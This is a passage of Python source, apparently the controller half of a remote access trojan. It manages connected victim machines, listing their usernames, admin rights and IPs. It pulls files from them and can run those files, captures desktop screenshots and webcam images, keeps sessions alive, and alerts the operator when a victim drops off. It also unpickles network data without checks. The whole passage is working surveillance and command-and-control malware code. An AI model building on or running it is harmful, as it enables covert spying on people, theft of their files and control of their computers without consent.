							pickled_msg = pickle.dumps({'message': Server.msg, 'image': f.read()})
							compressed_msg = zlib.compress(pickled_msg, 1)
							encrypted_msg = Server.encrypt.do_encrypt(compressed_msg) 
							final_msg = bytes(f'{len(encrypted_msg):<{Server.headersize}}', self.encoding) + encrypted_msg
							conn[0].send(final_msg)
					except:
						print(f'{self.theme[1]}Uploading {args} failed, please try again.{Style.RESET_ALL}', end='')
						if target is None:
							continue
						else:
							print('\n')
							Server.filter_client = None
							break

				# Note
				elif Server.msg[:4].lower() == 'note':
					try:
						note = Server.msg[5:].split('=>')
						assert len(note) == 2
						if note[0] == '':
							note[0] = 'global'
						if note[1] == '':
							raise Exception('Note message is empty.')
						dirs = ['Data', f'Data/{conn[2]}', f'Data/{conn[2]}/Notes']
						setup_directory(dirs)
						with open(f'{os.getcwd()}/{dirs[-1]}/{note[0].strip()}.txt', 'a') as f:
							f.write(f'{note[1].strip()}    [{time.strftime("%Y-%m-%d %H:%M-%S")}]\n')
						print(f'{self.theme[1]}Note{Style.RESET_ALL}{self.theme[3]} {note[0].strip()}.txt{Style.RESET_ALL}{self.theme[1]} written to complete!', end='')
					except:
						print(f'{self.theme[1]}Writing note failed, please try again.', end='')
					if target is None:
						continue
					else:
						print('\n')
						Server.filter_client = None
						break
				
				# Whoami
				elif Server.msg.lower() == 'whoami':
					info = ''
					for typez, item in conn[4]:
						info += f'\n{self.theme[1]}{typez}: {Style.RESET_ALL}{self.theme[3]}{item}{self.theme[1]}'
					print(f'{self.theme[1]}USER: {self.theme[3]}{conn[2]}{Style.RESET_ALL}{self.theme[1]}\nADMIN: {self.theme[3]}{conn[3]}{Style.RESET_ALL}{self.theme[1]}\nIP: {Style.RESET_ALL}{self.theme[3]}{conn[1][0]}{Style.RESET_ALL}{self.theme[1]}\nPORT: {Style.RESET_ALL}{self.theme[3]}{conn[1][1]}{Style.RESET_ALL}{info}', end='')
					if target is None:
						continue
					else:
						print('\n')
						Server.filter_client = None
						break
					
				# Session time
				elif Server.msg.lower() == 'time':
					print(f'{self.theme[1]}Session Start: [{Style.RESET_ALL}{self.theme[0]}{Server.sessionTime}{Style.RESET_ALL}{self.theme[1]}]{Style.RESET_ALL}')
					print(f'{self.theme[1]}Current time: [{Style.RESET_ALL}{self.theme[2]}{timer()}{Style.RESET_ALL}{self.theme[1]}]{Style.RESET_ALL}', end='')
					if target is None:
						continue
					else:
						print('\n')
						Server.filter_client = None
						break

				# Clear
				elif Server.msg.lower() == 'clear' or Server.msg.lower() == 'cls':
					clear_screen()
					if target is None:
						Server.session_clear_screen = True
						continue
					else:
						Server.filter_client = None
						break
				
				# Exit
				elif Server.msg.lower() == 'exit' or Server.msg.lower() == 'quit':
					print(f'{self.theme[2]}Session start: [{Style.RESET_ALL}{self.theme[0]}{Server.runningTime}{Style.RESET_ALL}{self.theme[2]}]{Style.RESET_ALL}')
					print(f'{self.theme[2]}Session end: [{Style.RESET_ALL}{self.theme[1]}{timer()}{Style.RESET_ALL}{self.theme[2]}]\n{Style.RESET_ALL}')
					print(f'{self.theme[4]}{conn[2]}\'s session quit successfully!\n{Style.RESET_ALL}')
					# Reset filter client
					Server.filter_client = None
					break

				# Send to client
				else:
					conn[0].send(final_msg)

				# Receive from client
				while True:
					# Recived buffer
					client_msg = conn[0].recv(81920)

					# New msg
					if Server.new_msg:
						Server.msg_len = int(client_msg[:Server.headersize])
						Server.new_msg = False

					# Append to full_msg
					Server.full_msg += client_msg

					# Recived full msg
					if len(Server.full_msg)-Server.headersize == Server.msg_len:
						decrypted_msg = Server.encrypt.do_decrypt(Server.full_msg[Server.headersize:])
						decompressed_msg = zlib.decompress(decrypted_msg)
						client_msg = pickle.loads(decompressed_msg)['message'].replace('ÿ', ' ')
						pickled_data = pickle.loads(decompressed_msg)
						result = f'{self.theme[1]}{client_msg}{Style.RESET_ALL}'

						# Download
						if Server.msg[:8].lower() == 'download':
							try:
								assert pickled_data['download']
								dirs = ['Data', f'Data/{conn[2]}', f'Data/{conn[2]}/Downloads']
								setup_directory(dirs)
								args = Server.msg[9:]
								if Server.msg[-2:].lower() == '-e':
									args = Server.msg[9:-3]
								with open(f'{os.getcwd()}/{dirs[-1]}/{args}', 'wb') as f:
									f.write(pickled_data['download'])
								if Server.msg[-2:].lower() == '-e':
									Popen(f'{os.getcwd()}/{dirs[-1]}/{args}', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
							except:
								pass
							finally:
								print(result, end='')
						
						# Download screenshot
						elif Server.msg.lower() == 'screenshot' or Server.msg.lower() == 'screenshot -s':
							try:
								dirs = ['Data', f'Data/{conn[2]}', f'Data/{conn[2]}/Screenshots']
								setup_directory(dirs)
								fn = time.strftime('%Y-%m-%d (%H-%M-%S).png')
								img = Image.fromarray(pickled_data['screenshot'], 'RGB')
								img.save(f'{os.getcwd()}/{dirs[-1]}/{fn}')
								if Server.msg[-2:].lower() == '-s':
									img.show()
							except:
								pass
							finally:
								print(result, end='')
						
						# Download webcam screenshot
						elif Server.msg[:6].lower() == 'webcam':
							try:
								dirs = ['Data', f'Data/{conn[2]}', f'Data/{conn[2]}/Webcam']
								setup_directory(dirs)
								fn = time.strftime('%Y-%m-%d (%H-%M-%S).png') 
								img = Image.fromarray(pickled_data['webcam'])
								b, g, r = img.split()
								img = Image.merge('RGB', (r, g, b))
								img.save(f'{os.getcwd()}/{dirs[-1]}/{fn}')
								if Server.msg[-2:].lower() == '-s':
									img.show()
							except:
								pass
							finally:
								print(result, end='')

						# Save stdout & as an image
						elif stdout_save[-5:].lower() == '-b -i' or stdout_save[-5:].lower() == '-i -b':
							try:
								dirs = ['Data', f'Data/{conn[2]}', f'Data/{conn[2]}/Stdout', f'Data/{conn[2]}/Stdout', f'Data/{conn[2]}/Stdout/Images']
								setup_directory(dirs)
								fn = time.strftime('%Y-%m-%d (%H-%M-%S)')
								# Text
								with open(f'{os.getcwd()}/{dirs[-2]}/{stdout_save[:-6]}--{fn}.txt', 'wb') as f:
									f.write(bytes(client_msg, self.encoding))
								# Image
								image = text_image(client_msg)
								image.show()
								image.save(f'{os.getcwd()}/{dirs[-1]}/{stdout_save[:-6]}--{fn}.png')
								print(result, end='')
							except:
								print(f'{self.theme[1]}Failed to backup command & image result.\n\n{Style.RESET_ALL}', end='')

						# Save stdout
						elif stdout_save[-2:].lower() == '-b':
							try:
								dirs = ['Data', f'Data/{conn[2]}', f'Data/{conn[2]}/Stdout']
								setup_directory(dirs)
								fn = time.strftime('%Y-%m-%d (%H-%M-%S).txt')
								with open(f'{os.getcwd()}/{dirs[-1]}/{stdout_save[:-3]}--{fn}', 'wb') as f:
									f.write(bytes(client_msg, self.encoding))
								print(result, end='')
							except:
								print(f'{self.theme[1]}Failed to backup command result.\n\n{Style.RESET_ALL}', end='')
						
						# Save stdout as an image
						elif stdout_save[-2:].lower() == '-i':
							try:
								dirs = ['Data', f'Data/{conn[2]}', f'Data/{conn[2]}/Stdout', f'Data/{conn[2]}/Stdout/Images']
								setup_directory(dirs)
								fn = time.strftime('%Y-%m-%d (%H-%M-%S).png')
								image = text_image(client_msg)
								image.show()
								image.save(f'{os.getcwd()}/{dirs[-1]}/{stdout_save[:-3]}--{fn}')
								print(result, end='')
							except:
								print(f'{self.theme[1]}Failed to backup image result.\n\n{Style.RESET_ALL}', end='')

						# Print stdout
						else:
							if stdout:
								print(result, end='')

						# Reset
						Server.new_msg = True
						Server.msg_len = 0
						Server.full_msg = b''
						break
			except KeyboardInterrupt:
				print(f'{self.theme[4]}Keyboard interrupt{Style.RESET_ALL}')
				if target is None:
					continue
				else:
					break
			except TimeoutError:
				print(f'{self.theme[4]}Your session has timed out, because of inactivity,\nor by having submitted an empty response.\n{Style.RESET_ALL}')
				# Reset filter client
				Server.filter_client = None
				break
			except KeyError:
				# Reset filter client
				Server.filter_client = None
				break
			except:
				if stdout:
					print(f'{self.theme[0]}Session start: [{Server.sessionTime}]{Style.RESET_ALL}{Style.RESET_ALL}')
					print(f'{self.theme[1]}Session end: [{timer()}]{Style.RESET_ALL}')
					print(f'{self.theme[4]}\nLost connection to client\n{Style.RESET_ALL}')
				# Reset filter client
				Server.filter_client = None
				if target is not None:
					return True
				break
			if target is not None:
				if stdout:
					print(end='\n\n')
				Server.filter_client = None
				break


	"""
		To send simple text message, not handling for
		any modules or special commands like screenshot
		or download. 
	"""
	def send_message(self, conn, message):
		pickled_msg = pickle.dumps({'message': message})
		compressed_msg = zlib.compress(pickled_msg, 1)
		encrypted_msg = Server.encrypt.do_encrypt(compressed_msg)
		final_msg = bytes(f'{len(encrypted_msg):<{Server.headersize}}', self.encoding) + encrypted_msg
		conn.send(final_msg)

		while True:
			# Recived buffer
			client_msg = conn.recv(81920)

			# New msg
			if Server.new_msg:
				Server.msg_len = int(client_msg[:Server.headersize])
				Server.new_msg = False

			# Append to full_msg
			Server.full_msg += client_msg

			# Recived full msg
			if len(Server.full_msg)-Server.headersize == Server.msg_len:
				decrypted_msg = Server.encrypt.do_decrypt(Server.full_msg[Server.headersize:])
				decompressed_msg = zlib.decompress(decrypted_msg)
				client_msg = pickle.loads(decompressed_msg)['message']

				# Reset
				Server.new_msg = True
				Server.msg_len = 0
				Server.full_msg = b''
				return client_msg


	"""
		Doesn't skip printing out connection if an index is cut out of the list,
		it also handles for long list. It handles for no connections & removing 
		dead connections. It also displays the correct index even after deleting
		a connection before others in the list.

		To achieve this:
			* Set connection no None
			* Set index to -1 for every deleted connection
			* Handle for long flag
			* Handle for 0 connections
	"""
	def list_connections(self, l):
		len_conns = len(Server.connections)
		results = ''
		i = 0
		for index, conn in enumerate(Server.connections):
			index += i
			try:
				x = self.session(self.getConn(index), True, 'aij4oaw4orn12u9w5ar7', False)
				if x is not None:
					raise Exception('Connection Error')
				info = ''

				if l:
					for typez, item in Server.information[index]:
						info += f'\n{self.theme[2]}{typez}{Style.RESET_ALL}{self.theme[2]}[{Style.RESET_ALL}{self.theme[3]}{item}{self.theme[2]}]'

					if l and len_conns > 1:
						info += '\n'

				results += f'{self.theme[2]}{Server.usernames[index]}[{Style.RESET_ALL}{self.theme[3]}{index}{Style.RESET_ALL}{self.theme[2]}] ADMIN[{Style.RESET_ALL}{self.theme[3]}{Server.priveldges[index]}{Style.RESET_ALL}{self.theme[2]}] IP[{Style.RESET_ALL}{self.theme[3]}{Server.addresses[index][0]}{Style.RESET_ALL}{self.theme[2]}] PORT[{Style.RESET_ALL}{self.theme[3]}{Server.addresses[index][1]}{Style.RESET_ALL}{self.theme[2]}]{Style.RESET_ALL}{info}\n'
			except:
				Server.connections[index] = None
				len_conns -= 1
				i -= 1

		for i, conn in enumerate(Server.connections):
			if conn is None:
				self.delete_client(i, Server.usernames[i])

		counter = f'{self.theme[2]}Number of connected clients ({Style.RESET_ALL}{self.theme[3]}{len_conns}{Style.RESET_ALL}{self.theme[2]})\n{Style.RESET_ALL}{self.theme[3]}{"-" * (30 + len(str(len_conns)))}\n{Style.RESET_ALL}'

		if len_conns == 0:
			results = f'{results}{self.theme[1]}No clients connected\n{Style.RESET_ALL}'

		if l and len_conns > 1:
			print(f'{self.theme[2]}{counter}{results}{Style.RESET_ALL}', end='')      
		else:
			print(f'{self.theme[2]}{counter}{results}{Style.RESET_ALL}')
		

	"""
		Delete client is a vital method to clean up & remove
		any unwanted connection, it's used all throughout the
		program if the connection is lost or is wanted to be closed.
	"""
	def delete_client(self, index, user):
		if self.history:
			now = time.strftime('%Y-%m-%d (%H-%M-%S)')

			if user == '*':
				for i, conn in enumerate(Server.connections):
					dirs = ['Data', f'Data/{Server.usernames[i]}']
					setup_directory(dirs)
					with open(f'{os.getcwd()}/Data/{Server.usernames[i]}/History.txt', 'a') as f:
						msg = f'DISCONNECTED: ({now})'
						f.write(f'{msg}\n{"-" * len(msg)}\n')
			else:
				dirs = ['Data', f'Data/{user}']
				setup_directory(dirs)
				with open(f'{os.getcwd()}/Data/{user}/History.txt', 'a') as f:
					msg = f'DISCONNECTED: ({now})'
					f.write(f'{msg}\n{"-" * len(msg)}\n')
		
		if self.console_notice:
			now = time.strftime('%H:%M')
			msg = ''
			if user == '*' or index == ':':
				msg = 'All clients disconnected.'
			else:
				msg = f'{Server.usernames[index]} Disconnected. ({now})\nAddress: {Server.addresses[index][0]}:{Server.addresses[index][1]}'
			now = time.strftime('%H:%M')				
			Server.toaster.show_toast('Disconnection Notice!', msg, icon_path=None, duration=5, threaded=True)

		if index == ':':
			for connection in Server.connections:
				connection.close()
			del Server.connections[:]
			del Server.addresses[:]
			del Server.usernames[:]
			del Server.priveldges[:]
			del Server.information[:]
		else:
			try:
				Server.connections[index].close()
			except:
				pass
			del Server.connections[index]
			del Server.addresses[index]
			del Server.usernames[index]
			del Server.priveldges[index]
			del Server.information[index]


	"""
		GetConn provides the complete data available for
		a specific user with the index as the only criteria.
		This method is passed in when calling session for
		user specific interaction.
	"""
	def getConn(self, target):
		conn = Server.connections[target]
		addr = Server.addresses[target]
		username = Server.usernames[target]
		privledge = Server.priveldges[target]
		info = Server.information[target]
		return (conn, addr, username, privledge, info)


	"""
		KeepAlive provides data to be sent to every client in
		order to prevent the socket being closed after inactivity.
		This is vital especially when dealing with multiple clients
		& would be alot of effort to keep them all alive manually.
		Without this method most Windows sockets close after 10 minutes
		of inactivity.
	"""
	def keepAlive(self):
		while True:
			counter = 0

			while counter < Server.keep_alive_timer:
				time.sleep(1)
				counter += 1
			
				if counter == Server.keep_alive_timer:
					for index, conn in enumerate(Server.connections):
						if Server.addresses[index][1] != Server.filter_client:
							try:
								self.send_message(conn, 'aij4oaw4orn12u9w5ar7')
							except:
								self.delete_client(index, Server.usernames[index])
					break


	"""
		These three methods is simply queuing up & threading
		the main methods of the Server class to work asynchronously. 
	"""
	def workers(self):
		for _ in range(Server.threads):
			threading.Thread(target=self.work, daemon=True).start()


	def work(self):
		while True:
			work = Server.q.get()
			if work == 1:
				self.listen()
				self.accept()
			if work == 2:
				self.shell()
			Server.q.task_done()


	def create_jobs(self):
		for job in Server.jobs:
			Server.q.put(job)
		Server.q.join()


"""
	Instantiate the Server object with the parsed arguments
	provided by the argparse module & run the neccesary
	methods as long as it is ran from the main file.
"""
if __name__ == '__main__':
	try:
		db_data = get_module_data()
		server = Server(db_data[1], db_data[2], args.username, args.theme, args.encoding, args.notice, args.email_notice.split(','), args.duplicates, args.whoami, args.history, args.banner, db_data[3].split(','))
		server.workers()
		server.create_jobs()
	except:
		os._exit(0)